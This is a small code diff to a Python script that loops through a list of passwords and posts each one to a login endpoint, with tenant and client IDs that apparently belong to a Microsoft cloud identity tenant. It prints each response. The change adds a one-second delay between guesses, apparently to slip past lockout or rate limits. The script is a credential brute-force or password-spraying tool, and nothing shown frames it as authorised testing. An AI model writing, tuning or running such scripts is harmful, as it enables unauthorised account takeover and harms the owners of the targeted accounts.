@@ -1,4 +1,5 @@
 import requests
+import time
 
 tenant_id = '1314b35d-bcab-4ece-b99b-67371e57f0a1'
 client_id = 'ec7b3a07-9969-4dbc-8022-1ac513c66909'
@@ -16,3 +17,4 @@ for password in passwords:
     }
     response = requests.post(login_url, data=data)
     print(f"Attempt with {password}: {response.status_code} - {response.text}")
+    time.sleep(1)
